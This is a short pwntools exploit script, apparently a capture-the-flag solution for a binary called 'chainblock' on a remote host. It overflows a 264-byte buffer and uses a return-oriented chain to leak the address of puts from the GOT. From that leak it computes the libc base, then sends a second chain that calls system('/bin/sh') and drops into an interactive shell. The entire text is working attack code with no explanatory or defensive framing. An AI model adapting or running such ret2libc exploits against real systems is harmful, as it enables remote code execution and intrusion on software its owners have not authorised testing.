#!/usr/bin/env python3
from pwn import *

local = False
elf = ELF('./chainblock')

if local:
    p = elf.process()
    libc = ELF('./libc.so.6')
else:
    host = 'pwn.be.ax'
    port = 5000
    p = remote(host, port)
    libc = ELF('./libc.so.6')

p.recvuntil('name: ')

main_adress = 0x40124b
puts_got_address = 0x404018
puts_plt_adress = 0x401080
pop_rdi = 0x401493

payload = b'A' * 264
payload += p64(pop_rdi)
payload += p64(puts_got_address)
payload += p64(puts_plt_adress)
payload += p64(main_adress)

print(p.sendline(payload))
print(p.recvline())
leaked_output = p.recvline()[:-1]
print('leaked puts() adress: ', leaked_output)

puts = u64((leaked_output + b"\x00\x00")[:8])
libc_adress = puts - libc.symbols['puts']
print("libc_adress: ", hex(libc_adress))

system = libc_adress + 0x04fa60
bin_sh = libc_adress + 0x1abf05
pop_rdi = 0x401493
ret = 0x40101a

payload = b'A' * 264 
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.clean()
p.sendline(payload)
p.interactive()

